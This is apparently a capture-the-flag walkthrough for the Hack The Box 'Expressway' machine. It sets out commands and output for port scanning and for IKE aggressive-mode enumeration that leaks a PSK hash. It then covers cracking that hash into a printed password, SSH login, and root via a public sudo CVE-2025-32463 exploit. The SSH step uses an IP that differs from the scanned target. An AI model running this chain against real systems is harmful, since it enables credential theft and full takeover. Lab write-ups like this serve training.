---
kind: walkthrough
platform: htb
target: expressway
scope: external
os: linux
tags: [htb, ike, ipsec]
---

# HTB — Expressway

Linux box. Only SSH on TCP; the way in is IKE/IPsec aggressive mode on UDP 500.

## Recon

<!-- meta: technique=port-scanning -->
```bash
nmap --privileged -sSCV -T4 -p0- -oA tcp_full 10.129.47.172
nmap --privileged -sU -T4 --top-ports 1000 -oA udp_1k 10.129.47.172
```
<!-- output -->
```
22/tcp   open  ssh     OpenSSH 10.0p2 Debian
500/udp  open  isakmp
```

## IKE / IPsec

Confirm a valid transform is offered:

<!-- meta: technique=ike-enumeration -->
```bash
ike-scan -M 10.129.47.172
```
<!-- output -->
```
Main Mode Handshake returned
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK ...)
```

Aggressive mode with a bogus group ID leaks the PSK hash and an identity (`ike@expressway.htb`):

<!-- meta: technique=ike-enumeration -->
```bash
ike-scan -P -M -A -n fakeID 10.129.47.172
```
<!-- output -->
```
Aggressive Mode Handshake returned
ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
IKE PSK parameters (...) written for cracking
```

## Credential access

Crack the captured PSK hash:

<!-- meta: technique=psk-cracking -->
```bash
psk-crack -d /usr/share/wordlists/rockyou.txt hash.txt
```
<!-- output -->
```
key "freakingrockstarontheroad" matches SHA1 hash
```

## Initial access

The recovered password logs the `ike` user in over SSH:

<!-- meta: technique=remote-exec -->
```bash
ssh ike@10.129.2.3
```

## Privesc

linpeas flags a vulnerable sudo version:

<!-- meta: technique=privesc-enum -->
```bash
./linpeas.sh
```
<!-- output -->
```
Sudo version 1.9.17  -> CVE-2025-32463
```

Run the chwoot exploit (https://github.com/pr0v3rbs/CVE-2025-32463_chwoot):

<!-- meta: technique=sudo-exploit -->
```bash
chmod +x test.sh
./test.sh
```
<!-- output -->
```
woot!
root@expressway:/# cat /root/root.txt
```
